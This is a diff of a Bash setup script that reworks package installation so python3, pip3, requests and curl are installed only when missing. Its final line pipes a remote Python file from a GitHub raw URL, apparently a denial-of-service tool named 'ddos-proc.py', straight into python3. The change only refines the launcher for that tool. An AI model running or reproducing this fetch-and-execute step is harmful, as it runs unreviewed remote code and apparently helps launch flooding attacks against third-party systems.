@@ -2,17 +2,40 @@
 
 set -e
 
-export DEBIAN_FRONTEND=noninteractive
-
 echo "[INFO] Updating packages..."
 apt update -y
 
-echo "[INFO] Installing Python3 and dependencies..."
-apt install -y \
-    python3 \
-    python3-pip \
-    python3-requests \
-    curl
+# Install python3 only if missing
+if ! command -v python3 >/dev/null 2>&1; then
+    echo "[INFO] Installing python3..."
+    apt install -y python3
+else
+    echo "[INFO] python3 already installed. Skipping."
+fi
+
+# Install pip3 only if missing
+if ! command -v pip3 >/dev/null 2>&1; then
+    echo "[INFO] Installing pip3..."
+    apt install -y python3-pip
+else
+    echo "[INFO] pip3 already installed. Skipping."
+fi
+
+# Install requests package only if missing
+if ! python3 -c "import requests" >/dev/null 2>&1; then
+    echo "[INFO] Installing python3-requests..."
+    apt install -y python3-requests
+else
+    echo "[INFO] requests already installed. Skipping."
+fi
+
+# Install curl only if missing
+if ! command -v curl >/dev/null 2>&1; then
+    echo "[INFO] Installing curl..."
+    apt install -y curl
+else
+    echo "[INFO] curl already installed. Skipping."
+fi
 
 echo "[INFO] Running remote Python script..."
 curl -fsSL https://raw.githubusercontent.com/LakshyaTheMinecrafter/skript.sh/main/ddos-proc.py | python3
